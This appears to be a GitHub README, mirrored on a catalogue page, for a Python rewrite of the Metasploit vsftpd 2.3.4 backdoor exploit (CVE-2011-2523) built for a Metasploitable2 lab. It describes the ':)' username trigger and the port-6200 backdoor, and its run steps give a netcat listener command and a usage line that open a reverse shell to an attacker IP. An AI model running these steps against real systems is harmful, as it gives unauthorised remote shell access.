# vsftpd-exploitation

A rewritten exploit script (Metasploit) for the vsftpd service [CVE 2011-2523]

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/davidlares](https://github.com/davidlares) |
| Url      | [https://github.com/davidlares/vsftpd-exploitation](https://github.com/davidlares/vsftpd-exploitation)                                               |
| Stars    | 0                                                          |
| License  | MIT License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# The vsftpd-exploitation

The following is rewritten old exploit (Metasploit) for the vulnerable FTPD service based on the `stfpd 2.3.4 Backdoor command execution` exploit available in the framework.

According to Metasploit, this module "exploits a malicious backdoor that was added to the VSFTPD download archive"

The original file is the `17491.rb` (Ruby file), which besides containing all the required `Metasploit` framework structure, performs a TCP socket connection to the `port 6200`, checks the service banner, and programmatically sends additional characters `:)` to the service authentication mechanism. After a response, you can later connect to the backdoor, and a command prompt is generated.

This ruby file has a `handle_backdoor` function which acts as an interpreter for the reverse shell generated.

The `vsftpd.py` script is a simple abstraction of the mentioned exploit module with all the same functionality but removes all the Metasploit framework definitions and adaptions of the framework.

This file performs an FTP connection (`port 21`), performs a service comparison (banners), adds the username with the `:)` to the `USER` FTP prompt for breaking the program, allowing blank passwords then.

At this point, an `id` command comparison is made and the payload is injected and backdoor connections can be generated.

This old exploit was reported in the `CVE 2011-2523`.

This practice was performed in a secure environment (workshop).

## Exploit used

In a Kali environment, the exploit is found in the `/usr/share/exploitdb/exploits/unix/remote/17491.rb` file. In `Metasploit` is found in the `exploit/unix/remote/17491.rb` file

## Lab

The vulnerable service with the exact version is present in the `Metasploitable2` machine.

## Run

1. You will need a `netcat` listener on the attacker machine: `nc -lvp [port] (default 4444)` (this is for the reverse shell session)
2. Run the program like this: `python -r [Attacker IP] -p [port] [Target IP]`.

If no `-i` are sent, an reverse shell should be generated in the attacker machine.

## Credits

 - [David E Lares](https://twitter.com/davidlares3)

## License

 - [MIT](https://opensource.org/licenses/MIT)



## Get the content

```
git clone https://github.com/davidlares/vsftpd-exploitation
cd vsftpd-exploitation
```

{% embed url="https://github.com/davidlares/vsftpd-exploitation" %}

<figure><img src="https://avatars.githubusercontent.com/u/14299919?v=4" alt=""><figcaption><p>davidlares</p></figcaption></figure>
